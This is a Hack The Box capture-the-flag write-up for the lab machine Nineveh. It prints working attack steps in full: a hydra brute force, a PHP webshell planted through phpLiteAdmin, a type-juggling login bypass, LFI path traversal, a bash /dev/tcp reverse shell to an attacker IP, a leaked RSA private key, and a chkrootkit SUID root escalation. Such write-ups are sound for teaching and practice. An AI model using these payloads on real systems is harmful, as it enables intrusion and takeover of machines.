---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: gobuster hydra metadata phpliteadmin authenticated rce id_rsa authorized_keys knockd port-knocking lfi localfileinclusion phpinfo typejugglingattack loginbypass hydra brute-force chkrootkit pspy64 
---

<br />

![1](../../../assets/images/Nineveh/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />

Hello hackers! Today we’re tackling Nineveh, a Medium Linux box with layers of classic and modern web exploitation. We kick things off by enumerating HTTP and HTTPS services, uncovering multiple web interfaces. A phpLiteAdmin panel becomes our initial target, where we brute-force the login to exploit an authenticated RCE via default value injection. However, to execute commands, we chain this with a Local File Inclusion vulnerability discovered in a separate web app—accessed by bypassing its login using a clever PHP type juggling trick. With RCE in hand, we pivot to gain a proper shell by leveraging leaked SSH keys and a port-knocking sequence revealed through LFI. Once inside as amrois, we monitor processes with pspy and discover a vulnerable chkrootkit cronjob. A simple SUID privilege escalation lands us a root shell. Great mix of web, auth bypass, and local escalation. Rooted! Preguntar a ChatGPT

<br />

# Enumeration:

<br />

We begin with a standard `nmap` scan to identify open ports and running services:

<br />

```bash
❯ nmap -p- 10.10.10.43 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 16:12 CEST
Nmap scan report for 10.10.10.43
Host is up (0.082s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.38 seconds
```

<br />

Open Ports:

`Port 80` -> HTTP 

`Port 443` -> HTTPS 

<br />

# HTTP Enumeration: - Port 80

<br />

On port 80, we find a default web page:

<br />

![2](../../../assets/images/Nineveh/2.png)

<br />

Perhaps with some directory fuzzing, we can discover interesting paths to explore.

<br />

## Fuzzing 

<br />

To enumerate hidden directories and files, we use `gobuster`:

<br />

```bash
❯ gobuster dir -u http://10.10.10.43 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.43
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 83681]
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]
Progress: 441134 / 441136 (100.00%)
===============================================================
Finished
===============================================================
```

<br />

We find several interesting results in the output.

Let's examine them one by one.

<br />

### /info.php

<br />

This page is the typical `phpinfo()` file:

<br />

![3](../../../assets/images/Nineveh/3.png)

<br />

### /department

<br />

This directory contains a `login` page:

<br />

![4](../../../assets/images/Nineveh/4.png)

<br />

We tested default credentials and basic `SQL` injection payloads `(' or 1=1-- -)` without success.

<br />

# HTTPS Enumeration - Port 443:

<br />

On port 443, we find a page displaying only a static image:

<br />

![5](../../../assets/images/Nineveh/5.png)

<br />

As we did with the HTTP page, we'll apply directory fuzzing here as well.

<br />

## Fuzzing

<br />

We'll use `gobuster` again, but this time with the `-k` flag to ignore `SSL` Certificate verification:

<br />

```bash
❯ gobuster dir -u https://10.10.10.43 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.43
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/server-status        (Status: 403) [Size: 300]
/secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]
Progress: 220567 / 220568 (100.00%)
===============================================================
Finished
===============================================================
```

<br />

We discover three new directories.

<br />

### /db

<br />

This path leads to a `phpLiteAdmin v1.9` login page:

<br />

![6](../../../assets/images/Nineveh/6.png)

<br />

`phpLiteAdmin` is an open-source PHP tool designed to manage `SQLite` databases through a web interface.

If we search for exploits targeting this version `(v1.9)`, we find an `authenticated RCE` affecting `phpLiteAdmin <= 1.9.3`. However, we can’t exploit it at this point since we don’t have valid credentials.

We confirm this with `searchsploit`:

<br />

```bash
❯ searchsploit phpLiteAdmin 1.9
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                                       | php/webapps/24044.txt
```

<br />

### /secure_notes

<br />

This path appears to be quite interesting.

However, when accessed, it only displays an image:

<br />

![7](../../../assets/images/Nineveh/7.png)

<br />

Sometimes, images may contain useful information in their metadata.

We proceed to download the image and inspect it locally using tools like `exiftool` or `strings` to extract potential embedded data:


<br />

```bash
❯ strings image.png
...[snip]...
www-data
www-data
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
0000644
0000041
0000041
00000000620
13126060277
014541
ustar  
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

<br />

These credentials expose a private/public key pair (`id_rsa` and `authorized_keys`) for the user `amrois`.

If `SSH` (port 22) were open, we could use this information to access the system as `amrois`.

However, since the port is closed, we'll need to continue enumerating.

<br />

# Exploiting phpLiteAdmin

## Brute Forcing

<br />

At this point, we can try brute-forcing the `/db` login page, since it only contains a single input field for the `password`.

To perform the attack, we use `hydra` with the following options:

- `-l`: Specifies the username. Since the login form doesn't require a username, we can use any placeholder value. 

- `-P`: Indicates the password wordlist to use.

- `https-post-form`: Specifies the HTTPS POST form module.

- `/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.`: This format defines the login path, the form field to fuzz, and the failure message. `^PASS^` is replaced by each password from the list, and `"Incorrect password"` is used to detect login failures.

Now, we can run it:

<br />

```bash
❯ hydra 10.10.10.43 -l fake -P /usr/share/wordlists/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-28 18:29:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.
[443][http-post-form] host: 10.10.10.43   login: fake   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 18:29:13
```

<br />

We have a valid match.

Using this, we can now log in successfully:

<br />

![8](../../../assets/images/Nineveh/8.png)

<br />

## Remote PHP Code Injection via phpLiteAdmin

<br />

The `24044.txt` exploit from `searchsploit` provides a proof of concept `(PoC)` for achieving remote PHP code injection through `phpLiteAdmin`.

The steps are the following:

<br />

### 1.- Create a db.

<br />

In this case, we'll create a database named `exploit.php`:

<br />

![9](../../../assets/images/Nineveh/9.png)

![10](../../../assets/images/Nineveh/10.png)

<br />

### 2.- Create a table in our new database:.

<br />

The table only needs one field:

<br />

![11](../../../assets/images/Nineveh/11.png)

<br />

Set the field `"Type"` to `TEXT`, and enter the following php code into the `"Default Value"` field:

<br />

```php
<?php system($_GET["cmd"]); ?>
```
![12](../../../assets/images/Nineveh/12.png)

<br />

⚠️ Note: It’s important to use double quotes `(")` instead of single quotes `(')` inside the `system()` function, so the GET parameter is correctly interpreted.

<br />

### 3.- Run the cmd.php:

<br />

At this point, everything is reached to execute our payload via `cmd.php`.

However, since the file is saved under `/var/tmp`, we need a `Local File Inclusion` (LFI) vulnerability to access it.

<br />

![13](../../../assets/images/Nineveh/13.png)

<br />

# /department Login Bypass (Type Juggling):

<br />

By intercepting the authentication request to the `/department` endpoint, we can attempt a common vulnerability found in PHP applications: a `Type Juggling` attack to bypass login logic. Type Juggling occurs when weak comparisons `(== instead ===)` are used in PHP, allowing unexpected type coercion. This can let an attacker trick the application into two different values as equal - often bypassing authentication.

To perform the attack, we only need to change the password field from `username=admin&password=admin` to `username=admin&password[]=` and click on `"Forward"`:

<br />

![14](../../../assets/images/Nineveh/14.png)

<br />

As a result, we successfully bypass the login and gain access as the `admin` user.

Once inside the application, we can click on the `"Notes"` button at the top-left corner and we will see the following:

<br />

![15](../../../assets/images/Nineveh/15.png)

<br />

Apparently, we’re seeing internal notes addressed to employees, including a reminder to fix the login bypass vulnerability we’ve just exploited.

If we inspect the URL, we notice a `notes` parameter pointing to a file path. This could be a promising candidate for testing file inclusion vulnerabilities.

<br />

```bash
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt
```

<br />

# Local File Inclusion (LFI)

<br />

The parameter is pointing to a file.

If we modify the URL and append an extra `.txt` (e.g., `ninevehNotes.txt.txt`), the server throws an error:

<br />

```bash
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt.txt
```
![16](../../../assets/images/Nineveh/16.png)

<br />

After several tries, we figure out a way that allows us to include internal files from the victim machine:

<br />

```bash
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../etc/passwd
```
![17](../../../assets/images/Nineveh/17.png)

<br />

By this way, we can point to the `/var/tmp/exploit.php` and run a command with our cmdshell as the `www-data` user:

<br />

```bash
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/exploit.php&cmd=whoami
```
![18](../../../assets/images/Nineveh/18.png)

<br />

With remote code execution confirmed, the next step is to spawn a reverse shell to gain full access to the system.

⚠️ Note: Make sure to URL-encode the ampersand `(&)` as `%26` to avoid request truncation and ensure the payload executes properly.

<br />

```bash
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/exploit.php&cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.7/443 0>%261'
```

<br />

Check the listener:

<br />

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.43 60652
bash: cannot set terminal process group (1385): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br />

We're in as `www-data`.

<br />

# Gaining Access - via knockd 

<br />

Another way to access the system is by using the LFI vulnerability to read the `knockd.conf`, which reveals the port-knocking sequence required to temporarily open the SSH port.

Before proceeding, let's review some key concepts:

- `Port-knocking`: Is a security technique used to protect network services by requiring a specific sequence of connection attempts to closed ports before allowing access to a target service.

- `knockd.conf`: This is the configuration file for the `knockd` daemon. It defines the sequence of ports a client must "knock" on and the corresponding action (e.g., opening SSH) that should be executed when the correct sequence is detected.

Once we understood that, let's list the `knockd.conf` taking advantage of the LFI:

<br />

```bash
http://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../etc/knockd.conf
```
![19](../../../assets/images/Nineveh/19.png)

<br />

From the output, we identify the required port-knocking sequence to open the SSH port: **571, 290, 911**.

With this information, we will use `knock` to open the port 22 of the victim machine from our Linux system:

<br />

```bash
knock 10.10.10.43 571 290 911
```

<br />

And now we can authenticate as the user `amrois` using the `id_rsa` that we get from the `secure_notes` path image:

⚠️ Make sure to set the correct permissions on the private key using `chmod 600 id_rsa` before connecting.

<br />

```bash
❯ ssh -i id_rsa amrois@10.10.10.43
...[snip]...
You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ whoami
amrois
```

<br />

We now have a shell as the `amrois` user:

And we can get the `user.txt` flag:

<br />

```bash
amrois@nineveh:~$ cat user.txt
67bbc6cddf93b05eee64d8a315xxxxxx
```

<br />

# Privilege Escalation: amrois -> root

<br />

While monitoring system activity using `pspy`, we notice the following scheduled task running as `root`:

<br />

```bash
amrois@nineveh:/tmp/Privesc$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
...[snip]...
2025/07/28 14:10:03 CMD: UID=0     PID=28911  | /bin/sh /usr/bin/chkrootkit
...[snip]...
```

<br />

We observe that `chkrootkit` is being executed periodically as `root`.

`Chkrootkit` is a common security tool used by system administrators to detect `rootkits` or signs of compromise on Unix-like systems.

<br />

# Chkrootkit v0.49 Exploit

<br />

After doing some research, we find a known local privilege escalation vulnerability in `chkrootkit v0.49`. This version is vulnerable to arbitrary command execution when certain conditions are met, allowing escalation to `root`.

<br />

```bash
❯ searchsploit chkrootkit
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                 | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                         | linux/local/33899.txt
```

<br />

The PoC outlines the following steps:

<br />

```bash
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)
```

<br />

We prepare our payload:

<br />

```bash
amrois@nineveh:/tmp$ cat update 
#!/bin/bash

chmod 4755 /bin/bash
```

<br />

Make the file executable:

<br />

```bash
amrois@nineveh:/tmp$ chmod +x update
```

<br />

Once the cronjob runs `chkrootkit`, it executes our `update` script with root privileges. We then verify that `/bin/bash` has the SUID bit set:

<br />

```bash
amrois@nineveh:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

<br />

We now spawn a root shell using the `-p` flag (preserve privileges):

<br />

```bash
amrois@nineveh:/tmp$ bash -p
bash-4.3# whoami
root
```

<br />

Finally, we read the `root.txt` flag:

<br />

```bash
bash-4.3# cat root.txt
5c64787e4abbd7f15c72c2ff8exxxxxx
```

<br />

System successfully pwned! ✅

I hope you learned something and enjoyed the machine.

Keep hacking!❤️❤️

<br />
